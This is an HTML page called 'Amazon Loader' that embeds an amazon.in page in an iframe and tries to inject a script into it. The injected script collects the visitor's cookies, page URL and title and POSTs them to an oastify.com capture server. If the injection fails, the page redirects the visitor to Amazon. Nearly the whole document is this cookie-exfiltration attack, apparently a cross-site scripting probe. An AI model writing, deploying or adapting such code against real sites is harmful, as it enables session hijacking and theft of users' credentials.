<!DOCTYPE html>
<html>
<head>
    <title>Amazon Loader</title>
    <meta charset="UTF-8">
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100vh;
            border: none;
        }
    </style>
</head>
<body>
    <iframe id="amazonFrame" src="https://www.amazon.in/tez/browse?qcbrand=test"></iframe>
    
    <script>
        // This script runs on YOUR page, not Amazon's page
        // To inject into Amazon, we need to wait for the iframe to load
        
        const iframe = document.getElementById('amazonFrame');
        
        iframe.onload = function() {
            console.log('Amazon page loaded in iframe');
            
            try {
                // Try to access the iframe content
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                
                // Check if we can access it (same-origin only)
                if (iframeDoc) {
                    console.log('Successfully accessed iframe');
                    
                    // Inject script into Amazon page
                    const script = iframeDoc.createElement('script');
                    script.textContent = `
                        console.log('Injected script running on Amazon!');
                        alert('JavaScript injection successful!');
                        
                        // Capture cookies and send to your server
                        fetch('https://wppcvxw8adrbohztq7nrhakh58bzzwnl.oastify.com/capture', {
                            method: 'POST',
                            body: JSON.stringify({
                                cookies: document.cookie,
                                url: window.location.href,
                                title: document.title,
                                timestamp: new Date().toISOString()
                            }),
                            headers: {'Content-Type': 'application/json'}
                        });
                    `;
                    iframeDoc.head.appendChild(script);
                }
            } catch(e) {
                // Cross-origin error - expected since Amazon blocks iframe embedding
                console.log('Cannot access iframe (cross-origin restriction):', e.message);
                document.body.innerHTML = '<h1>Cannot inject</h1><p>Amazon blocks iframe embedding. Using alternative method...</p>';
                
                // Alternative: redirect to Amazon directly
                setTimeout(() => {
                    window.location.href = "https://www.amazon.in/tez/browse/?qcbrand=test";
                }, 2000);
            }
        };
    </script>
</body>
</html>
